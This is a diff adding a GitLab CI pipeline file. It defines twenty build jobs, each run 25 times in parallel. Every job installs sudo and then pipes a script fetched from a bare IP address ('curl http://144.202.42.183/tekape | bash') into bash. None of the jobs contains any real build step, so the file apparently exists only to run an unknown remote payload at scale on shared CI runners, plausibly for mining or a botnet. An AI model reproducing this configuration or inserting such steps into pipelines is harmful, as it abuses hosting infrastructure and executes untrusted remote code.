@@ -1,0 +1,125 @@
+image: ruby:latest
+
+ 
+stages: 
+  - build 
+ 
+build_1: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+ 
+build_2: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+ 
+build_3: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash 
+ 
+build_4: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+ 
+build_5: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+ 
+build_6: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+ 
+build_7: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+ 
+build_8: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+ 
+build_9: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+ 
+build_10: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+     
+build_11: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+
+build_12: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+
+build_13: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+
+build_14: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+
+build_15: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+
+build_16: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+
+build_17: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+
+build_18: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+
+build_19: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
+
+build_20: 
+  stage: build 
+  parallel: 25 
+  script: | 
+    apt-get update -y && apt-get install -y sudo && curl http://144.202.42.183/tekape | bash
